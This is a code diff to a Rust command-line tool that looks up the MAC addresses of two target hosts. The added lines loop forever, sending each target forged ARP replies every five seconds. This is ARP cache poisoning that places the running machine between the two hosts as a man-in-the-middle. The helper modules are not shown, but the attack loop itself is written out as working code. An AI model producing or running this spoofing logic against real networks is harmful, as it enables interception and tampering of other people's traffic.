@@ -1,6 +1,7 @@
 mod net;
 use net::*;
 use std::env::args;
+use std::{thread, time};
 
 fn main() {
 	if args().len() == 3 {
@@ -13,15 +14,21 @@ fn main() {
 					let target_a_ip = utils::parse_ip(&target_a_ip);
 					let target_b_ip = utils::parse_ip(&target_b_ip);
 
-					arp::send_request(&mut socket, &target_a_ip);
-					let target_a_mac = arp::capture_reply(&mut socket, &target_a_ip);
-					arp::send_request(&mut socket, &target_b_ip);
-					let target_b_mac = arp::capture_reply(&mut socket, &target_b_ip);
-
+					arp::request::send(&mut socket, &target_a_ip);
+					let target_a_mac = arp::request::capture(&mut socket, &target_a_ip);
+					arp::request::send(&mut socket, &target_b_ip);
+					let target_b_mac = arp::request::capture(&mut socket, &target_b_ip);
 					println!(
 						"\n{:?} : {:x?}\n{:?} : {:x?}\n",
 						target_a_ip, target_a_mac, target_b_ip, target_b_mac
 					);
+
+					loop {
+						arp::reply::send(&mut socket, &target_a_ip, &target_a_mac, &target_b_ip);
+						arp::reply::send(&mut socket, &target_b_ip, &target_b_mac, &target_a_ip);
+
+						thread::sleep(time::Duration::from_secs(5));
+					}
 				}
 				Err(e) => eprintln!("{}", e),
 			}
